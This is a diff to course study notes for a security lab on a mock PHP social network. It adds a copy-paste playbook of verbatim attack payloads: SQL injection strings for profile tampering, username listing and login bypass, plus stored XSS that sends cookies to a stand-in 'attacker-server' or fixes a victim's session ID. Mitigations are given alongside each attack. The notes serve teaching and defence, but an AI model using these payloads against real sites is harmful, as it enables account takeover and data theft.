@@ -6,9 +6,30 @@
 
 ---
 
-## Executive Summary
+## Quick Lookup Index
 
-This module applies attack theory to a real (mock) application — **SocialNet**, a minimal PHP social network. Two teams operate: a **Red Team** that analyzes source code and executes exploits, and a **Blue Team** that patches vulnerabilities. Seven concrete attacks (ATT-1 through ATT-7) are mapped to their exact exploitation procedures and mitigations. All 7 attacks reduce to three root vulnerability classes: **Broken Access Control** (ATT-1, ATT-2), **SQL Injection** (ATT-3, ATT-4, ATT-5), and **Stored XSS** (ATT-6, ATT-7). Knowing the step-by-step exploitation procedure — not just the category name — is what the exam tests.
+**Sections:**
+1. Security Analysis Workflow
+2. Team Roles
+3. SocialNet Application
+4. Attack Catalog (Zero-Loss Extraction) — ATT-1 … ATT-7
+5. Complete Attack Comparison Table
+6. Defense Master Table
+- Deep Dive: Why Parameterized Queries Defeat All Three SQL Attacks
+- Deep Dive: Session Fixation vs Session Hijacking
+- Lab Playbook (Copy-Paste)
+- Knowledge Check Q&A
+
+**Key Terms / Attacks:**
+- **ATT-1** — CSRF / Broken Access Control: view unauthorized profile (`profile.php?owner=userX`)
+- **ATT-2** — CSRF / Broken Access Control: add user via admin page (nginx Basic Auth fix)
+- **ATT-3** — SQL Injection (form input, UPDATE): change any user's profile
+- **ATT-4** — SQL Injection (query string, UNION SELECT): list all usernames
+- **ATT-5** — SQL Injection (form input, UNION SELECT): login as any/non-existent user
+- **ATT-6** — Stored XSS + cookie theft: session hijacking
+- **ATT-7** — Stored XSS + cookie overwrite: session fixation
+
+**Searchable keywords:** CSRF token (hashed), UNION SELECT, `AND 1=0`, `--` comment, `'` quote test, `document.cookie`, `document.location`, `PHPSESSID`, `HttpOnly`, `Secure`, `SameSite=Strict`, `session_regenerate_id(true)`, `PDO::prepare`, parameterized query, ModSecurity WAF, nginx `auth_basic` / `.htpasswd`, `password_verify`, bcrypt hash.
 
 ---
 
@@ -382,21 +403,6 @@ In the safe version:
 
 ---
 
-## Key Takeaways for the Exam
-
-1. **ATT-1 and ATT-2** = Broken Access Control — check authorization, not just authentication.
-2. **ATT-3, ATT-4, ATT-5** = SQL Injection — parameterized queries defeat all three with a single architectural change.
-3. **UNION injection** (ATT-4, ATT-5) can **fabricate rows** — attacker does not need a real account to authenticate (ATT-5).
-4. **ATT-6** = Stored XSS + Session Hijacking — script in profile page steals cookie; defeated by `HttpOnly` flag.
-5. **ATT-7** = Stored XSS + Session Fixation — script overwrites victim's cookie with attacker's session ID; defeated by `session_regenerate_id(true)` on login.
-6. **CSRF token must be hashed** — unhashed tokens reveal generation logic, allowing forgery.
-7. **ATT-2 prevention** uses **nginx Basic Authentication** — a separate auth layer before the PHP application processes the request.
-8. **Defense-in-depth**: sanitize output **AND** set `HttpOnly` **AND** regenerate sessions — overlapping coverage so no single missed control creates full compromise.
-9. **The OWASP connection**: ATT-1/2 = Broken Access Control (#1 OWASP 2021), ATT-3/4/5 = Injection (#3), ATT-6/7 = XSS (Injection family).
-10. **Red team documents**: attack name, exact steps with preconditions, affected components/files, MITRE ATT&CK reference.
-
----
-
 ## Knowledge Check Q&A
 
 **Q1**: What is the exact URL an attacker uses in ATT-1 to view `userX`'s profile without being a friend?  
@@ -419,6 +425,87 @@ In the safe version:
 
 **Q7**: What single PHP function call defeats ATT-7, and when must it be called?  
 **A**: `session_regenerate_id(true)` must be called **immediately after successful login verification** — before storing any session data. This generates a new PHPSESSID, making the pre-fixed session ID invalid.
+
+---
+
+## Lab Playbook (Copy-Paste)
+
+All payloads VERBATIM. Each labeled by attack + one-line "what it does".
+
+**ATT-1 — CSRF / Broken Access Control: view a friend-only profile without being a friend.**
+Directly navigate to the profile URL (browser auto-sends session cookie):
+```
+http://server:port/socialnet/profile.php?owner=userX
+```
+CSRF-token URL format (token generated + validated server-side, must be hashed):
+```
+http://server:port/socialnet/profile.php?owner=userX&CSRF=<token>
+```
+
+**ATT-2 — CSRF / Broken Access Control: add a new user via admin endpoint without admin credentials.**
+Analyze the admin page request pattern (URL, method, params for user creation), then submit that request directly from an authenticated session. Defense (nginx Basic Auth on admin location):
+```nginx
+location /admin {
+    auth_basic "Admin Area";
+    auth_basic_user_file /etc/nginx/.htpasswd;
+}
+```
+
+**ATT-3 — SQL Injection (form input, UPDATE): modify any user's profile.**
+Inject into the `fullname` form field (closes string + retargets WHERE + comments rest):
+```
+hacked' WHERE username='victim';--
+```
+Resulting query:
+```sql
+UPDATE account SET fullname='hacked' WHERE username='victim';-- WHERE username='session_user'
+```
+
+**ATT-4 — SQL Injection (query string, UNION SELECT): list all usernames.**
+First confirm the param is injectable with a single quote (server error = vulnerable):
+```
+'
+```
+UNION payload appended to the URL `owner` parameter:
+```
+?owner=user1 UNION SELECT username,2,3,4 FROM account --
+```
+
+**ATT-5 — SQL Injection (form input, UNION SELECT): login as any/non-existent user.**
+Generate a bcrypt hash for a chosen password (e.g. `abc123`). Enter in the **username** field:
+```
+" AND 1=0 UNION SELECT 'user5','your_bcrypt_hash' -- 
+```
+Enter in the **password** field: `abc123`. Resulting query:
+```sql
+SELECT username, password FROM account WHERE username='"' AND 1=0 UNION SELECT 'user5','your_hash' -- '
+```
+`AND 1=0` voids the real row; UNION injects a fabricated `user5` row with attacker's hash → `password_verify('abc123','your_hash')` = TRUE.
+
+**ATT-6 — Stored XSS + cookie theft → session hijacking.**
+Store this JS as profile content; it exfiltrates the viewer's cookies (incl. PHPSESSID) to the attacker server:
+```javascript
+document.location = 'http://attacker-server/grab?cookie=' + document.cookie
+```
+Then set the stolen PHPSESSID in your browser (DevTools → Application → Cookies → set `PHPSESSID`) and reload → logged in as victim. Defeated by `HttpOnly` flag + output sanitization.
+
+**ATT-7 — Stored XSS + cookie overwrite → session fixation.**
+Store this JS as profile content; it overwrites the viewer's PHPSESSID with the attacker's pre-chosen, unauthenticated session ID:
+```javascript
+document.cookie = 'PHPSESSID=attacker_known_session_id; path=/'
+```
+Attacker logs out first; victim is logged out, logs in again on attacker's session ID → attacker reuses that ID as the victim. Defeated by `session_regenerate_id(true)` on login + `HttpOnly` + output sanitization.
+
+**Defensive code patterns:**
+```php
+// Parameterized query — defeats ATT-3/4/5
+$stmt = $pdo->prepare("SELECT * FROM account WHERE username=?");
+$stmt->execute([$username]);
+
+$stmt = $pdo->prepare("UPDATE account SET fullname=?, gender=? WHERE username=?");
+$stmt->execute([$fullname, $gender, $_SESSION['username']]);
+```
+Secure session cookie flags: `HttpOnly; Secure; SameSite=Strict`. Call `session_regenerate_id(true)` on every successful login.
 
 ---
 
